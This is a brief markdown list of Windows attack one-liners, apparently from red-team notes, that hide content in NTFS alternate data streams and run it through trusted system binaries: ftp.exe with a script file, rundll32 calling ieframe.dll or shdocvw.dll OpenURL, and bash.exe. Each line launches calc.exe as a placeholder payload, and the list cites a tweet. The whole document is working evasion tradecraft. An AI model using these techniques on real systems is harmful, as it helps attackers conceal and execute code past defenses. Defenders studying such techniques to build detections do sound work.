* FTP  ( Alternate data streams ) <br>
`echo !calc.exe > fakefile.txt:aaaa.txt && ftp -s:fakefile.txt:aaaa.txt`
* ieframe.dll , shdocvw.dll  (ads) <br>
`echo [internetshortcut] > fake.txt:test.txt && echo url=C:\windows\system32\calc.exe  >> fake.txt:test.txt`
`rundll32.exe ieframe.dll,OpenURL C:\temp\ads\fake.txt:test.txt` <br>
`rundll32.exe shdocvw.dll,OpenURL C:\temp\ads\fake.txt:test.txt`
* bash.exe (ads)
`echo calc > fakefile.txt:payload.sh && bash < fakefile.txt:payload.sh` <br>
`bash.exe -c $(fakefile.txt:payload.sh)` <br>

https://twitter.com/404death/status/1174571181581557761
